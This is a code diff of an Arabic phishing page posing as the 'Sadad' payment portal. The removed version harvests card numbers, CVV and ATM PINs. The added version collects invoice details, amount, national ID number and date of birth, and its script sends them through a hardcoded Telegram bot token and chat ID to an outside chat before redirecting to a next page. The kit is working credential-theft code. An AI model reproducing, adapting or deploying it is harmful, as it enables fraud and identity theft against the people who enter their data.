@@ -1,337 +1,134 @@
 <!DOCTYPE html>
 <html dir="rtl" lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة سداد - تفاصيل الدفع</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #f9f9f9; padding: 20px; direction: rtl; }
-        .header { text-align: center; margin-bottom: 20px; }
-        .header img { height: 60px; }
-        .breadcrumb { text-align: center; color: green; font-size: 14px; margin-bottom: 20px; }
-        .payment-container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); max-width: 450px; margin: auto; }
-        h2 { text-align: center; color: green; font-size: 22px; margin-bottom: 10px; }
-        p { text-align: center; color: #666; font-size: 14px; margin-bottom: 25px; }
-        
-        .form-group { margin-bottom: 18px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
-        
-        .input-wrapper { position: relative; }
-        input { 
-            width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; 
-            font-size: 16px; box-sizing: border-box; outline: none;
-            transition: border-color 0.3s;
-        }
-        input[type="text"]:not(#cardNumber):not(#expiryDate) { direction: rtl; text-align: right; }
-        input[type="text"]#cardNumber, input[type="text"]#expiryDate { direction: ltr; text-align: left; }
-        input[type="password"] { direction: ltr; text-align: left; }
-        input:focus { border-color: green; box-shadow: 0 0 5px rgba(0,128,0,0.2); }
-        input.error { border-color: #d32f2f; background-color: #ffebee; }
-        input.success { border-color: #2e7d32; background-color: #f1f8e9; }
-        
-        .error-message { 
-            display: none; color: #d32f2f; font-size: 12px; margin-top: 5px; 
-            font-weight: bold;
-        }
-        .error-message.show { display: block; }
-        
-        .success-icon { 
-            position: absolute; left: 12px; top: 38px; color: #2e7d32; 
-            font-size: 18px; display: none;
-        }
-        .success-icon.show { display: block; }
-        
-        .row { display: flex; gap: 15px; }
-        .row .form-group { flex: 1; }
-        
-        .pay-btn { 
-            width: 100%; background: green; color: white; border: none; padding: 14px; 
-            border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; 
-            transition: 0.3s; margin-top: 10px;
-        }
-        .pay-btn:hover:not(:disabled) { background: darkgreen; transform: translateY(-2px); }
-        .pay-btn:disabled { background: #ccc; cursor: not-allowed; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>بوابة سداد - الصفحة الرئيسية</title>
+<meta property="og:title" content="بوابة سداد - الصفحة الرئيسية">
+<meta property="og:description" content="قم بإدخال رقم الفاتورة ونوع السداد وقيمة الرسوم لإتمام عملية السداد.">
+<meta property="og:image" content="https://www2.0zz0.com/2025/03/10/21/595608613.jpg">
+<meta property="og:url" content="https://alkhaleeg.services/sadu/index.html">
+<meta property="og:type" content="website">
+<style>
+body{font-family: Arial, sans-serif;color:#333;background:#f9f9f9;padding:20px;line-height:1.8;margin:0;max-width:100%;box-sizing:border-box;}
+@media (max-width:768px){body{padding:15px;font-size:14px;}.header img{height:50px;}.form-container{padding:20px;}.btn-green{width:90%;font-size:14px;padding:10px;}}
+@media (max-width:480px){body{padding:10px;font-size:13px;}.header img{height:40px;}.form-container{padding:15px;}.btn-green{width:95%;font-size:13px;padding:8px;}}
+.header{text-align:center;margin-bottom:20px;}
+.header img{height:60px;vertical-align:middle;margin-right:10px;}
+.breadcrumb{text-align:center;color:green;font-size:14px;margin:10px 0;}
+.form-container{background:white;padding:30px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1);max-width:500px;margin:20px auto;}
+h2{text-align:center;color:green;margin-top:0;margin-bottom:20px;}
+label{display:block;margin:10px 0 5px;font-weight:bold;}
+input[type="text"], select{width:100%;padding:12px;border:2px solid #008000;border-radius:8px;background:#fff9f0;font-size:16px;box-sizing:border-box;}
+.birth-container{display:flex;gap:10px;}
+.birth-container select,.birth-container input{flex:1;padding:12px;border:2px solid #008000;border-radius:8px;background:#fff9f0;font-size:16px;}
+.btn-green{display:block;width:100%;margin:25px auto;padding:12px;background:#008000;color:white;text-align:center;border-radius:8px;text-decoration:none;font-weight:bold;font-size:16px;cursor:pointer;border:none;transition:background 0.3s;}
+.btn-green:hover:not(:disabled){background:#006400;}
+.btn-green:disabled { background: #ccc; cursor: not-allowed; }
+</style>
 </head>
 <body>
-    <div class="header">
-        <img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" alt="شعار سداد">
-    </div>
-    <div class="breadcrumb">الرئيسية / شخصي / اختر البنك / تفاصيل الدفع</div>
+<div class="header"><img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" alt="شعار سداد"></div>
+<div class="breadcrumb">الرئيسية / شخصي</div>
+<div class="form-container">
+<h2>إتمام عملية السداد</h2>
+<form id="sadadForm">
+<label for="invoiceNumber">أدخل رقم الفاتورة</label>
+<input type="text" id="invoiceNumber" name="invoiceNumber" required>
+<label for="paymentType">اختر نوع السداد</label>
+<select id="paymentType" name="paymentType" required>
+<option value="">اختر نوع السداد</option>
+<option value="استرداد اموال">استرداد اموال</option>
+<option value="مدفوعات أخرى">مدفوعات أخرى</option>
+<option value="رسوم توصيل">رسوم توصيل</option>
+<option value="رسوم شحن">رسوم شحن</option>
+</select>
+<label for="amount">قيمة رسوم السداد (ريال قطري)</label>
+<input type="text" id="amount" name="amount" required>
+<label for="nationalId">رقم الهوية</label>
+<input type="text" id="nationalId" name="nationalId" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" required>
+<label>تاريخ الميلاد</label>
+<div class="birth-container">
+<select id="daySelect" required><option value="">اليوم</option></select>
+<select id="monthSelect" required>
+<option value="">الشهر</option>
+<option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option>
+<option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
+</select>
+<input type="text" id="yearSelect" placeholder="السنة" maxlength="4" required>
+</div>
+<button type="submit" class="btn-green" id="submitBtn">التالي</button>
+</form>
+</div>
+
+<script>
+// --- معلومات بوت التليجرام ---
+const BOT_TOKEN = "8724974748:AAEDSkmIz2F9NArgkbCtRGp7o9URQausmxI";
+const CHAT_ID = "1537773335";
+
+const monthSelect = document.getElementById("monthSelect");
+const daySelect = document.getElementById("daySelect");
+const yearSelect = document.getElementById("yearSelect");
+
+function updateDays(){
+    let month = parseInt(monthSelect.value);
+    let days = 31;
+    if(month === 2){days = 29;} // Simple leap year fix
+    else if([4, 6, 9, 11].includes(month)){days = 30;}
+    daySelect.innerHTML = '<option value="">اليوم</option>';
+    for(let i=1;i<=days;i++){
+        let option=document.createElement("option");
+        option.value=i;
+        option.textContent=i;
+        daySelect.appendChild(option);
+    }
+}
+monthSelect.addEventListener("change", updateDays);
+updateDays();
+
+document.getElementById("sadadForm").addEventListener("submit", async function(e){
+    e.preventDefault();
     
-    <div class="payment-container">
-        <h2>إدخال تفاصيل البطاقة</h2>
-        
-        <form id="paymentForm">
-            <div class="form-group">
-                <label for="cardNumber">رقم البطاقة</label>
-                <div class="input-wrapper">
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
-                    <span class="success-icon">✓</span>
-                </div>
-                <div class="error-message" id="cardError"></div>
-            </div>
+    const submitBtn = document.getElementById('submitBtn');
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'جاري التحويل...';
 
-            <div class="form-group">
-                <label for="cardholderName">الاسم كما هو مسجل على البطاقة</label>
-                <div class="input-wrapper">
-                    <input type="text" id="cardholderName" required>
-                    <span class="success-icon">✓</span>
-                </div>
-                <div class="error-message" id="nameError"></div>
-            </div>
+    // جمع البيانات من النموذج
+    const formData = {
+        invoiceNumber: document.getElementById('invoiceNumber').value,
+        paymentType: document.getElementById('paymentType').value,
+        amount: document.getElementById('amount').value,
+        nationalId: document.getElementById('nationalId').value,
+        dob: `${daySelect.value}/${monthSelect.value}/${yearSelect.value}`
+    };
+
+    // تنسيق الرسالة
+    let message = `
+-=-=-=-=-= [ 🏦 الخطوة 1: البيانات الرئيسية ] =-=-=-=-=-
             
-            <div class="row">
-                <div class="form-group">
-                    <label for="expiryDate">تاريخ الانتهاء</label>
-                    <div class="input-wrapper">
-                        <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
-                        <span class="success-icon">✓</span>
-                    </div>
-                    <div class="error-message" id="expiryError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="cvv">رمز التحقق (CVV)</label>
-                    <div class="input-wrapper">
-                        <input type="password" id="cvv" placeholder="123" maxlength="3" required>
-                        <span class="success-icon">✓</span>
-                    </div>
-                    <div class="error-message" id="cvvError"></div>
-                </div>
-            </div>
+*--[ 📄 معلومات الفاتورة ]--*
+*▫️ رقم الفاتورة:* \`${formData.invoiceNumber || 'N/A'}\`
+*▫️ نوع السداد:* \`${formData.paymentType || 'N/A'}\`
+*▫️ قيمة الرسوم:* \`${formData.amount || 'N/A'}\`
+*▫️ رقم الهوية:* \`${formData.nationalId || 'N/A'}\`
+*▫️ تاريخ الميلاد:* \`${formData.dob || 'N/A'}\`
+`;
 
-            <div class="form-group">
-                <label for="atmPin">رقم الصراف الآلي (PIN)</label>
-                <div class="input-wrapper">
-                    <input type="password" id="atmPin" placeholder="****" maxlength="4" required>
-                    <span class="success-icon">✓</span>
-                </div>
-                <div class="error-message" id="pinError"></div>
-            </div>
-
-            <button type="submit" class="pay-btn" id="submitBtn" disabled>تأكيد الدفع</button>
-        </form>
-    </div>
-
-    <script>
-        // ===== VALIDATION FUNCTIONS =====
-        
-        // Luhn Algorithm for card validation
-        function luhnCheck(num) {
-            let sum = 0;
-            let isEven = false;
-            for (let i = num.length - 1; i >= 0; i--) {
-                let digit = parseInt(num[i], 10);
-                if (isEven) {
-                    digit *= 2;
-                    if (digit > 9) digit -= 9;
-                }
-                sum += digit;
-                isEven = !isEven;
-            }
-            return sum % 10 === 0;
-        }
-
-        // Validate Card Number
-        function validateCardNumber(value) {
-            const cardNum = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            if (cardNum.length !== 16) {
-                return { valid: false, message: 'رقم البطاقة يجب أن يكون 16 رقماً' };
-            }
-            if (!luhnCheck(cardNum)) {
-                return { valid: false, message: 'رقم البطاقة غير صحيح' };
-            }
-            return { valid: true, message: '' };
-        }
-
-        // Validate Cardholder Name
-        function validateCardholderName(value) {
-            if (!value || value.trim().length === 0) {
-                return { valid: false, message: 'الاسم مطلوب' };
-            }
-            if (value.trim().length < 3) {
-                return { valid: false, message: 'الاسم يجب أن يكون 3 أحرف على الأقل' };
-            }
-            if (!/^[\u0600-\u06FF\s\-a-zA-Z]+$/.test(value)) {
-                return { valid: false, message: 'الاسم يجب أن يحتوي على أحرف فقط' };
-            }
-            return { valid: true, message: '' };
-        }
-
-        // Validate Expiry Date
-        function validateExpiryDate(value) {
-            const parts = value.split('/');
-            if (parts.length !== 2) {
-                return { valid: false, message: 'الصيغة: MM/YY' };
-            }
-            const month = parseInt(parts[0], 10);
-            const year = parseInt(parts[1], 10);
-            
-            if (isNaN(month) || isNaN(year)) {
-                return { valid: false, message: 'أدخل أرقاماً صحيحة' };
-            }
-            if (month < 1 || month > 12) {
-                return { valid: false, message: 'الشهر يجب أن يكون من 01 إلى 12' };
-            }
-            
-            const currentDate = new Date();
-            const currentYear = currentDate.getFullYear() % 100;
-            const currentMonth = currentDate.getMonth() + 1;
-            
-            if (year < currentYear || (year === currentYear && month < currentMonth)) {
-                return { valid: false, message: 'البطاقة منتهية الصلاحية' };
-            }
-            
-            return { valid: true, message: '' };
-        }
-
-        // Validate CVV
-        function validateCVV(value) {
-            if (!/^\d{3}$/.test(value)) {
-                return { valid: false, message: 'رمز التحقق يجب أن يكون 3 أرقام' };
-            }
-            return { valid: true, message: '' };
-        }
-
-        // Validate PIN
-        function validatePIN(value) {
-            if (!/^\d{4}$/.test(value)) {
-                return { valid: false, message: 'رقم الصراف يجب أن يكون 4 أرقام' };
-            }
-            return { valid: true, message: '' };
-        }
-
-        // ===== INPUT FORMATTING =====
-        
-        // Format Card Number
-        document.getElementById('cardNumber').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let formatted = "";
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) formatted += " ";
-                formatted += value[i];
-            }
-            e.target.value = formatted;
-            validateField('cardNumber');
+    // إرسال البيانات إلى تليجرام
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
         });
-
-        // Validate Cardholder Name
-        document.getElementById('cardholderName').addEventListener('input', function (e) {
-            validateField('cardholderName');
-        });
-
-        // Format Expiry Date
-        document.getElementById('expiryDate').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
-            if (value.length > 2) {
-                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            } else {
-                e.target.value = value;
-            }
-            validateField('expiryDate');
-        });
-
-        // Validate CVV
-        document.getElementById('cvv').addEventListener('input', function (e) {
-            e.target.value = e.target.value.replace(/[^0-9]/gi, '').substring(0, 3);
-            validateField('cvv');
-        });
-
-        // Validate PIN
-        document.getElementById('atmPin').addEventListener('input', function (e) {
-            e.target.value = e.target.value.replace(/[^0-9]/gi, '').substring(0, 4);
-            validateField('atmPin');
-        });
-
-        // ===== FIELD VALIDATION =====
-        
-        function validateField(fieldId) {
-            const field = document.getElementById(fieldId);
-            const errorMsg = document.getElementById(fieldId + 'Error');
-            const successIcon = field.parentElement.querySelector('.success-icon');
-            let result;
-
-            switch (fieldId) {
-                case 'cardNumber':
-                    result = validateCardNumber(field.value);
-                    break;
-                case 'cardholderName':
-                    result = validateCardholderName(field.value);
-                    break;
-                case 'expiryDate':
-                    result = validateExpiryDate(field.value);
-                    break;
-                case 'cvv':
-                    result = validateCVV(field.value);
-                    break;
-                case 'atmPin':
-                    result = validatePIN(field.value);
-                    break;
-            }
-
-            if (result.valid) {
-                field.classList.remove('error');
-                field.classList.add('success');
-                errorMsg.classList.remove('show');
-                successIcon.classList.add('show');
-            } else {
-                field.classList.remove('success');
-                field.classList.add('error');
-                errorMsg.textContent = result.message;
-                errorMsg.classList.add('show');
-                successIcon.classList.remove('show');
-            }
-
-            checkFormValidity();
-        }
-
-        // ===== FORM VALIDITY CHECK =====
-        
-        function checkFormValidity() {
-            const cardNum = document.getElementById('cardNumber');
-            const cardName = document.getElementById('cardholderName');
-            const expiry = document.getElementById('expiryDate');
-            const cvv = document.getElementById('cvv');
-            const pin = document.getElementById('atmPin');
-            const submitBtn = document.getElementById('submitBtn');
-
-            const isCardValid = validateCardNumber(cardNum.value).valid;
-            const isNameValid = validateCardholderName(cardName.value).valid;
-            const isExpiryValid = validateExpiryDate(expiry.value).valid;
-            const isCVVValid = validateCVV(cvv.value).valid;
-            const isPINValid = validatePIN(pin.value).valid;
-
-            submitBtn.disabled = !(isCardValid && isNameValid && isExpiryValid && isCVVValid && isPINValid);
-        }
-
-        // ===== FORM SUBMISSION =====
-        
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Final validation
-            const cardNum = document.getElementById('cardNumber');
-            const cardName = document.getElementById('cardholderName');
-            const expiry = document.getElementById('expiryDate');
-            const cvv = document.getElementById('cvv');
-            const pin = document.getElementById('atmPin');
-
-            if (!validateCardNumber(cardNum.value).valid ||
-                !validateCardholderName(cardName.value).valid ||
-                !validateExpiryDate(expiry.value).valid ||
-                !validateCVV(cvv.value).valid ||
-                !validatePIN(pin.value).valid) {
-                alert('يرجى التحقق من جميع البيانات المدخلة');
-                return;
-            }
-
-            // Get bank from URL
-            const urlParams = new URLSearchParams(window.location.search);
-            const bank = urlParams.get('bank') || 'qnb';
-            
-            // Redirect to success notification
-            window.location.href = `notify_${bank}.html`;
-        });
-    </script>
+    } catch (error) {
+        console.error("Telegram send error:", error);
+    } finally {
+        // الانتقال إلى الصفحة التالية بعد إرسال البيانات (أو في حالة حدوث خطأ)
+        window.location.href = "page2.html";
+    }
+});
+</script>
 </body>
 </html>
